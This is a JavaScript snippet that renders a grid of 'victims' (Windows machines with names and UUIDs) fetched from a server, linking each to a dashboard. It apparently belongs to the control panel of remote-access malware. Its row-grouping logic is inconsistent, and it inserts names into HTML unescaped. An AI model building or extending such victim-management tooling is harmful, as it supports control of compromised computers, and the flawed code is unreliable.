// Displaying victims
let displayVictims = ()=>{
    $.get("/victims", (data,status)=>{
        html = ""
        for(let i = 0;i<data.size;i++){
            if(i % 5 == 0){
                html += `<div class="row">`
            }
            html += `
                <div class="col-lg-3">
                <a href="pages/dashboard.html?UUID=${data.data[i].UUID}">
                    <div class="victim-card">
                        <div class="v-img">
                            <img src="./resources/images/window-logo.png" class="img-fluid" alt="" />
                        </div>
                        <div class="v-info">
                            <h4>${data.data[i].name}</h4>
                            <p>${data.data[i].UUID}</p>
                        </div>
                    </div>
                </a>
                </div>
            `
            if(i == 4){
                html += `</div>`
            }
        }

        if(data.size % 4 != 0){
            html += `</div>`
        }
        $("#victim_container").html(html)
    })
}